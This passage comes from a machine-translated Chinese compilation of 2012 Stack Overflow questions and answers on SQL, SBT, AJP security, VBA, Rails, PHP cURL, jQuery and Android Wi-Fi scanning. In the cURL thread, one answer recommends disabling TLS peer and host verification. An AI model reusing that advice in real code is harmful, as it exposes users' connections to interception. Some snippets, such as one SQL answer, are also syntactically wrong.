您应该测试所有这些以确保变量具有您期望的值。**您似乎只希望`MAPS_DIR`;中只有一个目录 我会遵守那个约定，但它是不安全的。**一旦 makefile 到目前为止工作正常，您就可以添加规则。您可以使用 shell 循环：

```
all:
    rm ${DEST_DIR}/*.pgm
    for f in ${MAPS_DIR}/maps/*.pgm; do echo ln -s $$f ${DEST_DIR}/; done 
```

或使用 Make 语法（这有一些优点）：

```
MAPS := $(wildcard $(MAPS_DIR)/maps/*.pgm)
DEST_MAPS := $(patsubst $(MAPS_DIR)/maps/%.pgm, ${DEST_DIR}/%.pgm, $(MAPS))

all: $(DEST_MAPS)

${DEST_DIR}/%.pgm: $(MAPS_DIR)/maps/%.pgm
    rm $@
    ln -s $< ${DEST_DIR}/ 
```

# sql - SUM 查询...再次遇到问题

> ID：12460414
> 
> 赞同：0
> 
> 时间：2012-09-17T13:36:52.827
> 
> 标签：sql

所以我以前问过这样的问题，我想我只是不明白答案（尽管答案有效）将答案输入下一个问题

轻松查询。我正在拉员工，日期，totalhrs。每个员工的考勤卡计划之外。我正在寻找的是 totalhrs 列的总和，还要显示所有提交的考勤卡。所以我现在使用的代码

```
 SELECT date,totalhrs,SUM(totalhrs) 
 FROM tcardsubmit 
 WHERE employee= 'employee name' 
 ORDER BY date 
```

此代码显示

```
|EMPLOYEE | DATE        | TOTALHRS | SUM(TOTALHRS)
| myname  | myfirstdate |     5    |     10 
```

我希望它显示的是特定员工输入的所有考勤卡。不只是一个链接。因此，在“我的名字”中，我将有 3 个时间卡，其中 SUM 实际上等于一周提交的 10 小时。总和适用于数学。我似乎无法让它显示员工输入的所有考勤卡。这是我想要的样子

```
|EMPLOYEE | DATE         | TOTALHRS | SUM(TOTALHRS)
| myname  | myfirstdate  |     5    |     10
| myname  | myseconddate |     4    |     10
| myname  | mythirddate  |     1    |     10 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T13:41:14.037

测试一下，看看这是否适合你：

```
SELECT 
    date, 
    totalhrs, 
    (SELECT SUM(b.totalhrs) FROM tcardsubmit b WHERE b.employee = a.employee) AS totalhrs_sum 
FROM 
    tcardsubmit a 
WHERE 
    employee = 'employee name' 
ORDER BY 
    date 
```

**说明对于子选择中的 where 子句：** 在子选择 WHERE 子句中，我们正在检查仅获取与主选择员工 (b.employee = a.employee) 具有相同员工的记录，因此 SUM(b.totalhrs) 将只是您正在获取他的记录的员工的记录总和。在主选择中，我们说 FROM tcardsubmit a，因此我们将主 tcardsubmit 命名为 a，在子选择中，我们将表命名为 b，以避免由于使用相同的表和字段名称而产生任何冲突。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T13:47:16.190

```
SELECT tcardsubmit.employee, date,tcardsubmit.totalhrs, SumTotal.totalhrs
FROM tcardsubmit 
WHERE employee= 'employee name' 
inner join ( Select Employee, Sum(totalhrs) as TotalHrs From tcardSubmit Group By Employee) as sumTotal
On Sumtotal.employee = tcardsubmit.employee
ORDER BY date 
```

如果您想要一个聚合（Min、Max、sum 等）和详细信息，那么连接就是要走的路。

PS如果你有两个同名的员工你会怎么做！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T13:39:19.950

在这种情况下，除了要拉回的正常行之外，您还需要使用子查询来获取总小时数：

```
SELECT 
    date,
    totalhrs,
    (
    select 
        sum(a.totalhrs) 
    from 
        tcardsubmit a 
    where 
        a.employee=employee
    ) as TotalHrs
FROM 
    tcardsubmit 
WHERE 
    employee= 'employee name' 
ORDER BY 
    date 
```

# scala - 是否有 Maven POM 属性的 SBT 等效项？

> ID：12460415
> 
> 赞同：5
> 
> 时间：2012-09-17T13:36:54.420
> 
> 标签：scala, sbt

我正在使用 .sbt 构建定义文件，并且我定义了许多共享相同版本号的相关依赖项，例如：

```
libraryDependencies ++= Seq(
    "com.typesafe.akka" % "akka-actor" % "2.0.3",
    "com.typesafe.akka" % "akka-slf4j" % "2.0.3",
    ...
    "com.typesafe.akka" % "akka-testkit" % "2.0.3" % "test",
    ...
) 
```

我希望能够在一个地方指定版本号，就像您可以在 Maven 中使用properites 元素所做的那样，即您可以在您的 pom 中指定以下内容：

```
<propeties>
    <io.akka.version>2.0.3</io.akka.version>
</properties> 
```

然后在声明依赖项时引用该属性：

```
<dependency>
    ...
    <version>${io.akka.version}</version>
</dependency> 
```

有人知道 SBT 中是否有类似的方法？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-17T13:45:17.413

如果您使用的是完整配置（.scala 文件），只需编写简单的 scala 代码：

```
val ioAkkaVersion = "2.0.3"

libraryDependencies ++= Seq(
    "com.typesafe.akka" % "akka-actor" % ioAkkaVersion,
    "com.typesafe.akka" % "akka-slf4j" % ioAkkaVersion,
    ...
    "com.typesafe.akka" % "akka-testkit" % ioAkkaVersion % "test",
    ...
) 
```

对于 .sbt 配置，这看起来很相似，但不是那么优雅：

```
libraryDependencies ++= {
  val ioAkkaVersion = "2.0.3"
  Seq(
    "com.typesafe.akka" % "akka-actor" % ioAkkaVersion,
    "com.typesafe.akka" % "akka-slf4j" % ioAkkaVersion,
    ...
    "com.typesafe.akka" % "akka-testkit" % ioAkkaVersion % "test",
    ...
  )
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-17T15:05:44.597

也许是这样的？

```
def akka(artifact: String) = "com.typesafe.akka" % ("akka-" + artifact) % "2.0.3"

libraryDependencies ++= Seq(akka("actor"), akka("slf4j"), akka("testkit") % "test" ) 
```

# .net - 在每个分页中查找网格视图的第一行和最后一行索引号？

> ID：12460421
> 
> 赞同：1
> 
> 时间：2012-09-17T13:37:01.737
> 
> 标签：.net, vb.net, gridview, gridviewrow

嗨，我有一个 gridview 包含数百条记录，它正在进行分页，每个页面的大小为 10。现在我想在每个分页事件中找到 gridview 的第一行和最后一行索引号？有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:49:08.723

页码乘以页面大小不会给您页面上的最后一个索引吗？`MyGrid.PageIndex + 1 * MyGrid.PageSize` 对于页面上的第一个，您可以从您计算的最后一个索引中减去页面大小

# apache - 如何确保 Apache AJP 到 Tomcat 的连接是安全/加密的？

> ID：12460422
> 
> 赞同：5
> 
> 时间：2012-09-17T13:37:01.310
> 
> 标签：apache, tomcat, ssl, ajp

我们希望使用 Apache 实例（在同一台机器上运行）作为 Tomcat 实例的前端，该实例将通过 HTTPS 为所有内容提供服务，并使用 AJP 将 Apache 连接到 Tomcat。在使用 AJP 时，我们是否需要做任何事情来确保 Apache 和 Tomcat 之间的连接是安全的？（我们不希望密码在 Apache 和 Tomcat 之间的网络上被嗅探）。操作系统是 Red Hat Enterprise Linux 6.3

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-17T13:45:50.350

你是说

> 带有 Apache 实例的 Tomcat 实例（在同一台机器上运行）

后来你说

> 我们不希望密码在 Apache 和 Tomcat 之间的网络上被嗅探

这只是相互矛盾。

编辑：AJP[并非设计为安全](http://tomcat.10.n6.nabble.com/Secure-AJP-over-ssl-td2083890.html)的，如果您需要安全性，请`mod_proxy_http`通过 https 使用和代理，或创建 SSH 隧道。不用说，您将不得不为此开销付费。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-09-17T21:56:27.000

使用 AJP 时，您*无法*做任何事情来确保其安全。它不是。没有 SSL 版本。您必须使用 HTTPS。AJP 专为 HTTPD 和 Tomcat 在同一个专用 LAN 中且安全不是问题的常见情况而设计。

# vba - Excel-VBA 如何知道哪个动态创建的 UserForm TextBox 发生了变化？

> ID：12460423
> 
> 赞同：1
> 
> 时间：2012-09-17T13:37:04.417
> 
> 标签：vba, excel, event-handling, excel-2010

我有一个在执行期间创建文本框的 excel 用户窗体。代码如下；

```
Dim CompHandler() As New CCompHandler
Dim tb As MSForms.TextBox   
Dim count As Integer
For i in Range(something)
    If i = anotherthing Then
        Set tb = UserForm1.Controls.Add("Forms.TextBox.1", "tb" & count)
        With tb
            .Width = iTbWidth
            .Top = count * distance
            .Left = iTbLeft
            .Height = iTbHeight
            .Value = Cells(row, column)
            ReDim Preserve CompHandler(0 To count)
            Set CompHandler(count).TextBoxGroup = tb
        End With
    count = count + 1
    End If
Next i 
```

我想将更改后的值写回相应的单元格。我已经能够在盒子发生变化时获得新值，并在 a 上使用此代码获得新值`class called CCompHandler`：

```
Option Explicit

Public WithEvents TextBoxGroup As MSForms.TextBox

Private Sub TextBoxGroup_Change()

    MsgBox TextBoxGroup

End Sub 
```

所以..关于如何获得哪个文本框已更改的任何想法？或者也许有更好的方法来做到这一点？提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T13:54:36.503

Tag 属性通常用于这样的事情。在创建时添加如下内容：

```
With tb
  ...
  .Tag = i.Address
...
End With 
```

然后，您可以稍后访问 Tag 属性，例如：

```
Debug.Print tbWhoseValueHasChanged.Tag 
```

您的代码片段有很多未定义/不清楚的变量，包括`i`. 我假设它是上面的一个范围变量。

# c# - 起订量问题 - 仅在构建服务器（TeamCity）上

> ID：12460426
> 
> 赞同：2
> 
> 时间：2012-09-17T13:37:08.567
> 
> 标签：c#, teamcity, moq

我有一个被嘲笑的界面：

```
public interface IEmailService
{
    void SendAsHtml(string to, string from, string subject, string notification);
    void SendAsHtml(string to, string from, string subject, string notification, string[] cc);
} 
```

它以前是带有参数 string[] cc 的单个方法，但我在尝试找出构建服务器上的问题时将方法分开。我真正想要的是一个严格的模拟，但我现在以动态方式运行它，所以我可以使用以下验证来比较结果：

```
emailService.Verify(es => es.SendAsHtml(accountEmail, fromEmail, subject, expectedEmailString)); 
```

参数在 accountEmail、fromEmail 和主题上匹配 - 它是 expectedEmailString（在被测方法中通过 string.Format 构造）似乎不起作用。我在测试时将预期值和实际值写入控制台，在查看输出时，它们在构建服务器上似乎是相同的。这是测试失败（这是来自我试图强制进行序数比较的变体）：

> 对模拟的预期调用至少一次，但从未执行：es => es.SendAsHtml(.accountEmail, .fromEmail, .subject, It.Is(s => s.Equals(.expectedEmailString, StringComparison.Ordinal)))未配置任何设置。
> 
> 执行的调用：IEmailService.SendAsHtml("user@test.com", "sender@email.net", "asdfasdf", "long html string")

以下是我认为的相关设置（全部直接注入被测控制器）：

```
 var getPersonalAccount = new Mock<IGetPersonalAccount>(MockBehavior.Strict);
    getPersonalAccount.Setup(gpa => gpa.WithAccountId(userAccountId).Execute()).Returns(account);

    var emailService = new Mock<IEmailService>();

    var trialSettings = new Mock<TrialSettings>(MockBehavior.Strict);
    trialSettings.Setup(ts => ts.Length).Returns(trialLength);
    trialSettings.Setup(ts => ts.FromEmail).Returns(fromEmail);
    trialSettings.Setup(ts => ts.Subject).Returns(subject); 
```

试用设置返回主题和发件人地址，并从帐户中删除收件人电子邮件地址。消息正文也使用来自帐户的值进行格式化。

相关位：

*   TeamCity 7.1 (build 23907) - 尝试了 nunit 2.5.10 和 2.6 测试运行器
*   .NET 4
*   NUnit 2.5.10.11092
*   起订量 4.0.10827.0

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-21T12:39:00.083

所以，我最终只是删除了对巨大 HTML 字符串的“整个字符串”检查，并仅检查以确认我们注入到字符串中的值（通过 string.format）在那里。这在本地和服务器上都通过。这并不理想，但我想这也不是世界上最糟糕的事情。

# google-app-engine - 在 GAE 中使用 trigger.io

> ID：12460427
> 
> 赞同：1
> 
> 时间：2012-09-17T13:37:10.647
> 
> 标签：google-app-engine, trigger.io

我想尝试使用 trigger.io。

我们有一个 Web 应用程序并使用 GAE。我们如何使用 trigger.io 测试我们的 Web 应用程序？我在工具包的“WEB”部分看到只有“Heroku”的位置。可能吗？我们需要迁移吗？我如何使用 android 测试我们的网络应用程序？我找不到将它指向我们的 index.html 的位置。

非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T16:05:49.560

Toolkit 中的 web 部分基本上允许您将移动应用程序部署为基于 Node.js 的移动网站。

如果您有一个想要用作移动应用后端的现有 Web 应用，那么这就是公开某种 HTTP API 的情况，然后您的移动应用会与之交互。

让移动应用程序只接收来自 GAE 的 JSON，构建其 HTML 视图并将它们呈现给用户，效果非常好。

# postgresql - Rails 3.2 + pg gem：加载路径问题

> ID：12460428
> 
> 赞同：2
> 
> 时间：2012-09-17T13:37:13.250
> 
> 标签：postgresql, ruby-on-rails-3.2

我有两个 Rails 应用程序，“旧”一个和一个新的，用

```
 $ rails new blog -d postgresql 
```

当我尝试启动服务器时，它可以在“旧”应用程序上正常工作：

```
 $ rails s -p 2000
    => Booting WEBrick
    => Rails 3.2.8 application starting in development on http://0.0.0.0:2000
    => Call with -d to detach
    => Ctrl-C to shutdown server
    [2012-09-17 16:28:48] INFO  WEBrick 1.3.1
    [2012-09-17 16:28:48] INFO  ruby 1.9.3 (2012-04-20) [x86_64-linux]
    [2012-09-17 16:28:48] INFO  WEBrick::HTTPServer#start: pid=9377 port=2000 
```

但“新”应用程序失败：/

```
 $ rails s -p 2000
    /usr/local/share/gems/gems/pg-0.14.1/lib/pg.rb:4:in `require': cannot load such file -- pg_ext (LoadError)
    from /usr/local/share/gems/gems/pg-0.14.1/lib/pg.rb:4:in `<top (required)>'
    from /usr/local/share/gems/gems/bundler-1.1.5/lib/bundler/runtime.rb:68:in `require'
    from /usr/local/share/gems/gems/bundler-1.1.5/lib/bundler/runtime.rb:68:in `block (2 levels) in require'
    from /usr/local/share/gems/gems/bundler-1.1.5/lib/bundler/runtime.rb:66:in `each'
    from /usr/local/share/gems/gems/bundler-1.1.5/lib/bundler/runtime.rb:66:in `block in require'
    from /usr/local/share/gems/gems/bundler-1.1.5/lib/bundler/runtime.rb:55:in `each'
    from /usr/local/share/gems/gems/bundler-1.1.5/lib/bundler/runtime.rb:55:in `require'
    from /usr/local/share/gems/gems/bundler-1.1.5/lib/bundler.rb:119:in `require'
    from /home/alex/tmp/RoR/blog/config/application.rb:7:in `<top (required)>'
    from /usr/local/share/gems/gems/railties-3.2.8/lib/rails/commands.rb:53:in `require'
    from /usr/local/share/gems/gems/railties-3.2.8/lib/rails/commands.rb:53:in `block in <top (required)>'
    from /usr/local/share/gems/gems/railties-3.2.8/lib/rails/commands.rb:50:in `tap'
    from /usr/local/share/gems/gems/railties-3.2.8/lib/rails/commands.rb:50:in `<top (required)>'
    from script/rails:6:in `require'
    from script/rails:6:in `<main>' 
```

如果我将 pg_ext.so 复制或符号链接到模块路径，则可以修复：

```
 # ln -s /usr/local/share/gems/gems/pg-0.14.1/ext/pg_ext.so /usr/local/share/gems/gems/pg-0.14.1/lib 
```

或者我可以直接向 boot.rb 添加要求：

```
 require 'rubygems'
    require 'pg' 
```

但这不是可接受的解决方案，我想知道为什么它适用于第一个应用程序以及为什么它不适用于新应用程序？我花了一整天比较配置文件，但没有成功。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-30T19:43:06.307

升级到 Fedora 18 后我遇到了同样的问题。

pg_ext 在运行 gem update 时构建。

一个先决条件是安装了 postgresql-devel。

# jquery - 在 css 文件中使用 PIE.htc 时 IE8 浏览器选项卡崩溃

> ID：12460436
> 
> 赞同：1
> 
> 时间：2012-09-17T13:37:34.227
> 
> 标签：jquery, html, css, css3pie

仅在 IE8 上的 css 文件中使用 PIE.htc 时，我似乎遇到了问题。它使浏览器选项卡崩溃，事件查看器说：

错误应用程序 iexplore.exe，版本 8.0.6001.18702，错误模块 mshtml.dll，版本 8.0.6001.18702，错误地址 0x0020fbd7。

如果我在 css 文件中删除对 PIE.htc 的引用，它会正确加载。

我不确定，但这可能与 jquery 1.7.2 有关 - 如果我停止 jquery 加载，它也可以工作。有没有其他人遇到过这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:42:38.833

PIE 和 jQuery 存在一些问题，如下[所示](http://css3pie.com/forum/viewtopic.php?f=3&t=779)。你具体想用 jQuery 做什么。如果您实际上没有调用任何 jQuery 方法，是否会发生这种情况，即如果您实际上只是包含一个指向 jQuery 的脚本元素，它会停止工作？或者您是否尝试使用特定的 jQuery 方法..？控制台中的任何错误..？

# javascript - javascript控制jqueryajax从其他页面加载的数据

> ID：12460437
> 
> 赞同：0
> 
> 时间：2012-09-17T13:37:42.017
> 
> 标签：javascript, jquery

我是 javascript 新手 我的 Javascript 代码无法处理从另一个页面 searchworld.php 获取的数据当我看到页面源时，获取的数据没有出现

```
<script type="text/javascript" >
$(function() {

    $(".search").keyup(function() {
        var searchbox = $(this).val();
        var dataString = 'searchword='+ searchbox;

        if(searchbox=='')
        {
        }
        else
        {

            $.ajax({
                type: "POST",
                url: "worldsearch.php",
                data: dataString,
                cache: false,
                success: function(html){

                    $("#display").html(html).show();

                }

            });
        }
        return false;    

    });
});
</script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:44:47.740

```
$(".search").on("keyup", function() { 
```

`.on()`使您的事件绑定到使用 AJAX 加载的新添加的内容上

# php - cURL 从 Google 安全浏览查找中获取响应

> ID：12460440
> 
> 赞同：1
> 
> 时间：2012-09-17T13:37:46.023
> 
> 标签：php, curl

我正在尝试使用 Google 安全浏览查找 API 获得响应，如下所示：

```
$url ="https://sb-ssl.google.com/safebrowsing/api/lookup?client=myappname&apikey=mykey&appver=1.0&pver=3.0&url=".urlencode($myurl);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 120);
$body = curl_exec($ch);
$info = curl_getinfo($ch); 
```

我知道我的 URL 是正确的，因为如果我转储它然后将其粘贴到浏览器，我会得到预期的结果（例如“恶意软件”）。所以我假设它一定是带有 cURL 的东西。我正在处理 localhost 并且 extension=php_curl.dll 在我的 php.ini，Php 版本 5.4.4 中未注释

html_code 始终为 0

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:50:30.417

只需将 CURLOPT_SSL_VERIFYPEER 和 CURLOPT_SSL_VERIFYHOST 设置为 false。

[我的 cURL 代码有什么问题（http 状态为 0）吗？](https://stackoverflow.com/questions/4570973/anything-wrong-with-my-curl-code-http-status-of-0)

还要检查[http://code.google.com/p/twitter-api/issues/detail?id=1291](http://code.google.com/p/twitter-api/issues/detail?id=1291)，它可能会有所帮助。它是不同的 API，但无论如何都有相同的问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:25:24.480

问题及其解决方案在这里得到了很好的描述：

[http://richardwarrender.com/2007/05/the-secret-to-curl-in-php-on-windows/](http://richardwarrender.com/2007/05/the-secret-to-curl-in-php-on-windows/)

基本上，如果您不使用 cURL 的独立版本，则 cURL 函数可能不包含我的情况所需的证书包，因为我试图连接到**安全**主机。

```
$ch = curl_init();
// Apply various settings
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_CAINFO, "C:/xampp/ca-bundle.crt"); //path to the CA-bundle
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
$result = curl_exec ($ch);
curl_close($ch); 
```

# jquery - 在特定 div 中加载页面

> ID：12460441
> 
> 赞同：0
> 
> 时间：2012-09-17T13:37:48.723
> 
> 标签：jquery, twitter-bootstrap

我有一个指向不同网址的引导导航列表

```
 <div class="span2">
                <div class="sidebar-nav">
                    <ul class="nav nav-list">                       
                        <li class="active">
                            <a class="pass" href="#">Password</a>
                        </li>
                        <li>
                            <a class="favor" href="#">My Favorites</a>
                        </li>
                        <li>
                            <a class="open" href="#">Open</a>
                        </li>
                    </ul>
                </div>
        </div> 
```

当我单击任何 url 时，我想在下面给出的 div 中加载页面而不打开新页面，我该怎么做？

```
 <div class="span10">
            <div class="page-content">
                  <div class="pass">
                  </div>
                  <div class="favor">
                  </div>
                  <div class="open">
                  </div>
            </div>
        </div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:52:38.347

您需要使用 JQuery .load()

[http://api.jquery.com/load/](http://api.jquery.com/load/)

所以，首先你需要给你的目标 div 一个 id，像这样：

```
<div class="span10" id="target"> 
```

然后您需要将 onClick 事件绑定到运行以下加载的每个链接

```
$('#target').load('/url/for/passwordadmin'); 
```

绑定 onClick 事件的建议方法是在 document.ready 上运行它：

```
$(".passwordAdmin").click(function() {
  $('#target').load('/url/for/passwordadmin');
}); 
```

您应该为每个应该具有此功能的链接执行此操作。

# android - 如何获取所有wifi接入点的BSSID？

> ID：12460445
> 
> 赞同：13
> 
> 时间：2012-09-17T13:37:52.243
> 
> 标签：android, android-wifi, wifi

我需要获取所有 AP 的 BSSID(MAC)。请在下面找到代码块。

```
 List<WifiConfiguration> test =  wifiManager.getConfiguredNetworks();
    for(int k=0;k<test.size();k++){ 
        Log.d("acheck", "test BSSID = "+test.get(k).BSSID);         
        Log.d("acheck", "test BSSID = "+test.get(k).BSSID);    
   } 
```

但上面的代码块正确返回 SSID，但 BSSID 为空。我想使用用户定义的 SSID 连接到最强的接入点。是否有任何 API 方法可用于获得具有用户定义的 SSID 的最佳信号强度的 AP。（在我的情况下，有许多具有单个 SSID 的 SSID 和多个可用的 AP。）

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-22T00:06:33.387

改编了@ToonSuperLove 的答案，主要是为了避免 NPE。

```
public class WifiTest extends Activity {

    public void loadWifiAvailableList(EditText etWifiList) {
        WifiManager wifiManager = (WifiManager) 
                                    getSystemService(Context.WIFI_SERVICE);
        List<ScanResult> results = wifiManager.getScanResults();
        String message = "No results. Check wireless is on";
        if (results != null) {
            final int size = results.size();
            if (size == 0) message = "No access points in range";
            else {
                ScanResult bestSignal = results.get(0);
                etWifiList.setText(""); // etWifiList is EditText
                int count = 1;
                for (ScanResult result : results) {
                    etWifiList.append(count++ + ". " + result.SSID + " : "
                            + result.level + "\n" + result.BSSID + "\n"
                            + result.capabilities + "\n"
                            + "\n=======================\n");
                    if (WifiManager.compareSignalLevel(bestSignal.level,
                            result.level) < 0) {
                        bestSignal = result;
                    }
                }
                message = String.format(
                        "%s networks found. %s is the strongest.", size,
                        bestSignal.SSID + " : " + bestSignal.level);
            }
        }
        Toast.makeText(this, message, Toast.LENGTH_LONG).show();
    }
} 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-09-27T04:22:49.617

在配置中，它只是设置部分（例如，询问用户/密码/WPA 或 NULL 等等的对话框）

要从 AP 获取 BSSID，需要从 ScanResult 获取

```
public void loadWifiAvailableList() {
    List<ScanResult> results = wifiManager.getScanResults();
    ScanResult bestSignal = null;
    etWifiList.setText(""); // etWifiList is EditText
    int count = 1;
    for (ScanResult result : results) {
        etWifiList.append(count++ + ". " + result.SSID + " : " + result.level + "\n" +
                result.BSSID + "\n" + result.capabilities + "\n" +
                "\n=======================\n");

      if (bestSignal == null || WifiManager.compareSignalLevel(bestSignal.level, result.level) < 0) 
      {
        bestSignal = result;
      }
    }

    String message = String.format("%s networks found. %s is the strongest.",
        results.size(), bestSignal.SSID + " : " + bestSignal.level);
    Toast.makeText(this, message, Toast.LENGTH_LONG).show();
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-08-19T16:58:40.010

要获取当前连接的 WIFI 网络的 BSSID，请使用 WiFiInfo 类。

```
 WifiManager wifiMan = (WifiManager) context.getSystemService(
                            Context.WIFI_SERVICE);
            WifiInfo wifiInfo = wifiMan.getConnectionInfo();

            String macAddr = wifiInfo.getMacAddress();
            String bssid = wifiInfo.getBSSID(); 
```

# hadoop - 在亚马逊 EMR 上运行 HBase 时，为什么 /tmp 文件夹与实际数据相比很大？

> ID：12460446
> 
> 赞同：1
> 
> 时间：2012-09-17T13:37:52.980
> 
> 标签：hadoop, hbase, amazon-emr

我们在亚马逊 EMR 上有一个默认配置的 hadoop+hbase 集群，因此`mapred.child.tmp`和都`hbase.tmp.dir`指向`/tmp`. 我们的集群已经运行了一段时间，现在`/tmp`是 500Gb，而实际`/hbase`数据是 70Gb。

这种差异似乎太大了，我们应该定期删除一些`/tmp`数据吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-01T06:15:29.910

经过一番调查，我发现我们的大部分`/tmp`数据是由 Amazon 将 Hbase 自动备份到 S3 期间失败的 mapreduce 任务创建的。我们成功的 mapreduce 任务不会在`/tmp`.

我们决定禁用亚马逊的自动备份，并使用 Hbase 工具实现我们自己的备份脚本来导入/导出表。

# bash - bash 邮件：主题中的命令输出

> ID：12460448
> 
> 赞同：2
> 
> 时间：2012-09-17T13:38:00.907
> 
> 标签：bash, email

我尝试使用命令发送邮件，`mail`主题中包含其他命令的输出

```
subj="hello from $(hostname -s) $(date)" 
echo "data" | mail -s $subj mail@mail 
```

但我只得到主题的第一部分（`hello from`）。

为什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-17T13:40:39.303

您需要引用您的主题，如下所示：

```
echo "data" | mail -s "$subj" mail@mail 
```

如果您不引用它，`mail`程序将不知道您的主题在哪里结束，并将第一个“单词”（`hello`）作为主题，并将其他所有内容作为地址。

一般来说，最好总是引用你的变量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-16T17:00:12.020

/youScriptOrOutput.sh | mail -s "来自主机的主题 $(hostname -s) $(date)" my@email.com

# google-image-search - 谷歌图片搜索 api 限制

> ID：12460449
> 
> 赞同：4
> 
> 时间：2012-09-17T13:38:02.403
> 
> 标签：google-image-search

我正在编写一个 Java 应用程序，它需要从谷歌图像搜索（或类似的）中获取图像。

它就像网络电话一样简单： [http ://ajax.googleapis.com/ajax/services/search/images?v=1.0&q=japan](http://ajax.googleapis.com/ajax/services/search/images?v=1.0&q=japan)

但是，响应限制为每页 8 个结果。谷歌搜索每天只有 100 个请求是免费的，所以每天有 800 个结果。

那是对的吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-17T13:44:09.627

该已弃用 API 的替代品在这里：[https](https://developers.google.com/custom-search/v1/overview) ://developers.google.com/custom-search/v1/overview和他们指出的计费：

> 如果您未注册计费，超出免费使用配额的任何使用都将失败。启用计费后，您将继续每天收到 100 次免费查询。但是，对于所有额外的请求，您将按每 1000 次查询 5 美元的费率付费，每天最多 10,000 次查询。

因此，另一种选择是，简单地说，为你需要的东西买单。

这里有很多来自类似问题的信息：[最好的网络图像搜索 API 是什么？](https://stackoverflow.com/questions/533857/whats-the-best-web-image-search-api)

该线程上的某人指出：

> 自 2012 年 8 月起，必应 API 将成为 Azure 市场的一部分：免费访问仍然可用，但仅限于一些查询（5000 次/月）。Google 将免费访问限制为每天 100 个查询。

那么也许 Bing 有足够的免费配额来满足您的需求？该页面上还有其他选项，请查看。

# regex - 正则表达式检查空格

> ID：12460450
> 
> 赞同：-1
> 
> 时间：2012-09-17T13:38:06.817
> 
> 标签：regex

我有一个文本框，但验证长度是否 < 1。但是，如果我使用键盘空格键并输入空格，则保持按钮检查的验证不起作用。请用正则表达式帮助检查这些空格

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T13:40:06.077

正则表达式`^\s+$`将匹配完全由一个或多个空格组成的任何字符串。查看[此](http://www.regular-expressions.info/tutorial.html)正则表达式教程以获取更多信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T13:40:21.833

这将匹配一个空字符串或任意数量的空白字符：`/^\s*$/`

# asp.net-mvc - ASP.NET MVC 3 自动完成

> ID：12460462
> 
> 赞同：0
> 
> 时间：2012-09-17T13:38:41.387
> 
> 标签：asp.net-mvc, jquery-autocomplete

[我将此处](http://jqueryui.com/demos/autocomplete/#event-create)的示例代码粘贴到我的 .cshtml 文件中，只是为了查看它是否适用于硬编码数据。

对于一些准备好的，当我键入时自动完成不起作用。

以下是代码：

```
<script>
$(function () {
    var availableTags = [
        "ActionScript",
        "AppleScript",
        "Asp",
        "BASIC",
        "C",
        "C++",
        "Clojure",
        "COBOL",
        "ColdFusion",
        "Erlang",
        "Fortran",
        "Groovy",
        "Haskell",
        "Java",
        "JavaScript",
        "Lisp",
        "Perl",
        "PHP",
        "Python",
        "Ruby",
        "Scala",
        "Scheme"
    ];
    $("#tags").autocomplete({
        source: availableTags
    });
});
</script>
<div class="demo">

<div class="ui-widget">
    <label for="tags">Tags: </label>
    <input id="tags">
</div>

</div><!-- End demo --> 
```

当然，在此之后还有其他控件和表格等。

谁能发现我可能会出错的地方？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:00:27.697

尝试将此添加到您的 .cshtml 中。这是我用来让智能感知工作的东西。

```
@if (false) { <script src="/Scripts/jquery-1.7.2-vsdoc.js" type="text/javascript"></script>  } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T13:51:54.553

此代码有效。您需要包括：

*   jQuery js
*   jquery-ui css
*   jquery-ui js

您的代码示例（不带 css）：[jsfiddle.net/cZYuA/](http://jsfiddle.net/cZYuA/)

# android - 如何在简单适配器的 imageview 中显示图像？

> ID：12460463
> 
> 赞同：7
> 
> 时间：2012-09-17T13:38:41.410
> 
> 标签：android, image, imageview, simpleadapter

我从 JSON 数组获取数据，我可以在 textviews 中显示文本，但在显示图像时遇到问题。

这是主要活动：

```
public class test extends ListActivity {

// url to make request
private static String url = "http://test/json.php";

// JSON Node names
private static final String CONTACTS = "contacts";
private static final String NAME = "name";
private static final String IMAGE = "image";

// contacts JSONArray
JSONArray contacts = null;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    // Hashmap for ListView
    ArrayList<HashMap<String, String>> contactList = new ArrayList<HashMap<String, String>>();

    // Creating JSON Parser instance
    JSONParser jParser = new JSONParser();

    // getting JSON string from URL
